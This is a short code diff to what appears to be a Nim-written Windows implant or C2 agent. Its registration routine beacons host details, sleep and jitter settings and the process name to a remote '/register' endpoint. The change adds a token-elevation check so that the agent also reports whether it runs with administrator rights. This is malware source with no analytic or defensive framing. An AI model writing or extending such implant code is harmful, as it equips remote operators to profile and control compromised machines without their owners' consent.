@@ -91,6 +91,15 @@ else:
       resp.add(buf[0..<int(got)])
     return (int(code), resp)
 
+  proc isElevated(): bool =
+    var token: HANDLE
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr token) == 0: return false
+    defer: discard CloseHandle(token)
+    var elev: DWORD = 0; var sz: DWORD = sizeof(elev).DWORD
+    discard GetTokenInformation(token, cast[TOKEN_INFORMATION_CLASS](20),
+                                addr elev, sz, addr sz)
+    result = elev != 0
+
   proc register*(t: var AgentTransport): bool =
     let info = %*{
       "hostname": getEnvStr("COMPUTERNAME","UNKNOWN"),
@@ -100,7 +109,8 @@ else:
       "transport": config.Transport,
       "sleep_sec": SleepSec,
       "jitter_pct": JitterPct,
-      "process_name": exeName()
+      "process_name": exeName(),
+      "is_admin": isElevated()
     }
     let (code, resp) = t.winHttpDo("POST", "/register", cast[seq[byte]]($info))
     if code != 200 or resp.len == 0: return false
